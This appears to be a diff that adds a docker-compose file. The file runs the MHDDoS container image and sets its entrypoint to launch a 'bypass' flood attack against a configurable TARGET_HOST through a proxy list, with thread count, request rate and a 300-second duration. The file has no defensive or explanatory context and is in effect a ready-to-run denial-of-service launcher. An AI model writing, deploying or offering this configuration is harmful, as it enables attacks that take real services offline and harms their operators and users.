@@ -1,0 +1,17 @@
+services:
+  mhddos:
+    image: ghcr.io/mhprodev/mhddos:latest
+    container_name: mhddos
+    volumes:
+      - ./secrets/proxy.txt:/proxy.txt
+    entrypoint: >
+      python 
+      start.py 
+      bypass
+      ${TARGET_HOST}
+      5 
+      100
+      /proxy.txt
+      100
+      300
+      true
